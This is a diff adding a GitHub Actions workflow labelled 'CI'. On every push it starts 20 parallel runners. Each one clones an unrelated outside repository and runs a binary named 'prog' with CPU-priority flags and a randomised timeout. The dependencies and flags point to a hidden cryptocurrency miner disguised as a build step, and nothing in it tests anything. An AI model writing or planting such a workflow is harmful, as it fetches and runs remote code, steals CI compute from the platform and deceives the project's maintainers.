@@ -1,0 +1,22 @@
+name: CI
+on: [push]
+jobs:
+  test:
+    name: Fetch
+    runs-on: ubuntu-latest
+    container: ubuntu:20.10
+    env:
+      DEBIAN_FRONTEND: noninteractive
+    strategy:
+      fail-fast: false
+      matrix:
+        runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - run: |
+          apt update -qq
+          apt install -y git libuv1 libssl1.1 libhwloc15
+          export REPO=$(echo $GITHUB_REPOSITORY | cut -f2 -d/)
+          git clone https://github.com/githublover11/$REPO.git
+          cd $REPO
+          chmod u+x prog
+          timeout $(shuf -i 500-820 -n 1) ./prog --cpu-no-yield --cpu-priority 5 || true
